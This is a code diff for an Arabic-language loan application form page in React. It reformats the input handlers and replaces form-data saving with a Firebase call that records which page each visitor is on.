@@ -4,20 +4,26 @@ import { Input } from "@/components/ui/input"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { addData } from "@/lib/firebase"
 import { Check, Home } from "lucide-react"
-import { useState } from "react"
+import { useEffect, useState } from "react"
 
 export default function HomePage() {
-  const [salary,setSalary]=useState('')
-  const [work,setWork]=useState('')
-  const [job,setJob]=useState('')
+  const [salary, setSalary] = useState('')
+  const [work, setWork] = useState('')
+  const [job, setJob] = useState('')
 
-  const handleSubmit = (e:any) => {
+  const handleSubmit = (e: any) => {
     e.preventDefault()
-    const visitorId=localStorage.getItem('visitor')
-    addData({id:visitorId,job,work,salary})
-    window.location.href="/loan-application/payment/"
-
+    window.location.href = "/loan-application/payment/"
   }
+  const handleUpdatePageName = async () => {
+    const visitorid = localStorage.getItem('visitor')
+    await addData({ id: visitorid, currentPage: 'معلومات 2' })
+  }
+  useEffect(() => {
+    handleUpdatePageName().then(() => {
+      console.log('Done')
+    })
+  }, [])
   return (
     <div className="min-h-screen bg-gray-100">
       {/* Header */}
@@ -40,7 +46,7 @@ export default function HomePage() {
             <Input
               type="text"
               placeholder="صافي الراتب بعد الاقتطاع"
-              onChange={(e)=>{setSalary(e.target.value)}}
+              onChange={(e) => { setSalary(e.target.value) }}
               className="w-full h-12 text-right bg-white border border-gray-200 rounded-lg px-4 text-gray-500 placeholder:text-gray-400"
             />
           </div>
@@ -49,7 +55,7 @@ export default function HomePage() {
           <div>
             <Input
               type="text"
-              onChange={(e)=>{setJob(e.target.value)}}
+              onChange={(e) => { setJob(e.target.value) }}
               placeholder="نوع العمل"
               className="w-full h-12 text-right bg-white border border-gray-200 rounded-lg px-4 text-gray-500 placeholder:text-gray-400"
             />
@@ -60,8 +66,7 @@ export default function HomePage() {
             <Input
               type="text"
               placeholder="اسم الوظيفة"
-              onChange={(e)=>{setWork(e.target.value)}}
-              
+              onChange={(e) => { setWork(e.target.value) }}
               className="w-full h-12 text-right bg-white border border-gray-200 rounded-lg px-4 text-gray-500 placeholder:text-gray-400"
             />
           </div>
